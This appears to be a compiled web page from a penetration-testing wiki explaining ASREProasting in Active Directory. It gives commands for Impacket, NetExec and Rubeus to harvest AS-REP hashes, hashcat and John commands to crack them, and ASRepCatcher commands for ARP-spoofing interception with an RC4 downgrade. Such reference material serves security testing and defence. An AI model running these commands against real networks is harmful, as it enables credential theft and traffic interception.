import{_ as o,c as p,a5 as r,G as t,w as a,B as n,o as k,j as s,a as i}from"./chunks/framework.B5CpDqM0.js";const E=JSON.parse('{"title":"ASREProast","description":"","frontmatter":{"authors":"ShutdownRepo, Yaxxine7, mpgn"},"headers":[],"relativePath":"ad/movement/kerberos/asreproast.md","filePath":"ad/movement/kerberos/asreproast.md","lastUpdated":1724982529000}'),d={name:"ad/movement/kerberos/asreproast.md"};function c(g,e,u,y,b,F){const h=n("PluginTabsTab"),l=n("PluginTabs");return k(),p("div",null,[e[2]||(e[2]=r('<h1 id="asreproast" tabindex="-1">ASREProast <a class="header-anchor" href="#asreproast" aria-label="Permalink to &quot;ASREProast&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named &quot;pre-authentication&quot; (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast).</p><p>The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. Technically, when asking the KDC (Key Distribution Center) for a TGT (Ticket Granting Ticket), the requesting user needs to validate pre-authentication by sending a timestamp encrypted with it&#39;s own credentials. It ensures the user is requesting a TGT for himself. Once validated, the TGT is then sent to the user in the <code>KRB_AS_REP</code> message, but that message also contains a session key. That session key is encrypted with the requested user&#39;s NT hash.</p><p>Because some applications don&#39;t support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline. This is ASREProasting.</p><p>While this technique can possibly allow to retrieve a user&#39;s credentials, the TGT obtained in the <code>KRB_AS_REP</code> messages are encrypted cannot be used without knowledge of the account&#39;s password.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="tip custom-block"><p>While this attack can be carried out without any prior foothold (domain user credentials), there is no way of finding out users with <code>Do not require Kerberos preauthentication</code> set without that prior foothold.</p></div>',8)),t(l,null,{default:a(()=>[t(h,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[s("p",null,[i("The "),s("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i(" script "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py",target:"_blank",rel:"noreferrer"},"GetNPUsers"),i(" (Python) can get TGTs for the users that have the property "),s("code",null,"Do not require Kerberos preauthentication"),i(" set.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# users list dynamically queried with an LDAP anonymous bind")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetNPUsers.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -request"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -format"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," hashcat"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ASREProastables.txt"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN/'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with a users file")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetNPUsers.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -usersfile"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," users.txt"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -request"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -format"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," hashcat"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ASREProastables.txt"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN/'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# users list dynamically queried with a LDAP authenticated bind (password)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetNPUsers.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -request"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -format"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," hashcat"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ASREProastables.txt"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN/USER:Password'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# users list dynamically queried with a LDAP authenticated bind (NT hash)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetNPUsers.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -request"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -format"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," hashcat"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -outputfile"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ASREProastables.txt"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN/USER'")])])])],-1),s("p",null,[i("This can also be achieved with "),s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),i(" (Python).")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ldap"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--asreproast"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ASREProastables.txt"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --KdcHost"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $KeyDistributionCenter")])])])],-1),s("p",null,[i("The "),s("a",{href:"https://github.com/skelsec/kerberoast",target:"_blank",rel:"noreferrer"},"kerberoast"),i(" pure-python toolkit is a good alternative to the tools mentioned above.")],-1)])),_:1}),t(h,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[s("p",null,[i("The same thing can be done with "),s("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),i(" from a session running with a domain user privileges.")],-1),s("div",{class:"language-powershell vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"powershell"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asreproast  "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"format:hashcat "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"outfile:ASREProastables.txt")])])])],-1)])),_:1})]),_:1}),e[3]||(e[3]=r(`<p>Depending on the output format used (<code>hashcat</code> or <code>john</code>), <a href="https://github.com/hashcat/hashcat" target="_blank" rel="noreferrer">hashcat</a> and <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noreferrer">JohnTheRipper</a> can be used to try <a href="./../credentials/cracking">cracking the hashes</a>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">hashcat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 18200</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -a</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ASREProastables.txt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $wordlist</span></span></code></pre></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">john</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --wordlist=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$wordlist</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ASREProastables.txt</span></span></code></pre></div><h3 id="asreproast-mitm" tabindex="-1">ASREProast MitM <a class="header-anchor" href="#asreproast-mitm" aria-label="Permalink to &quot;ASREProast MitM&quot;">​</a></h3><p>Another way to conduct AS-REP roasting, without relying on Kerberos pre-authentication being disabled, would be to have a man-in-the-middle position on the network and catch AS-REPs. <a href="https://github.com/Yaxxine7/ASRepCatcher" target="_blank" rel="noreferrer">ASRepCatcher</a> (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Proxy between the clients and the DC, forcing RC4 downgrade if supported</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ASRepCatcher</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> relay</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -dc</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $DC_IP</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Disables ARP spoofing (the MitM must be obtained with other means)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ASRepCatcher</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> relay</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -dc</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $DC_IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--disable-spoofing</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Passively listen for AS-REP packets, no packet alteration</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ASRepCatcher</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> listen</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://blog.xpnsec.com/kerberos-attacks-part-2/" target="_blank" rel="noreferrer">https://blog.xpnsec.com/kerberos-attacks-part-2/</a></p><p><a href="https://blog.harmj0y.net/activedirectory/roasting-as-reps/" target="_blank" rel="noreferrer">https://blog.harmj0y.net/activedirectory/roasting-as-reps/</a></p><p><a href="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx" target="_blank" rel="noreferrer">https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx</a></p><p><a href="https://en.hackndo.com/kerberos" target="_blank" rel="noreferrer">https://en.hackndo.com/kerberos</a></p>`,11))])}const m=o(d,[["render",c]]);export{E as __pageData,m as default};
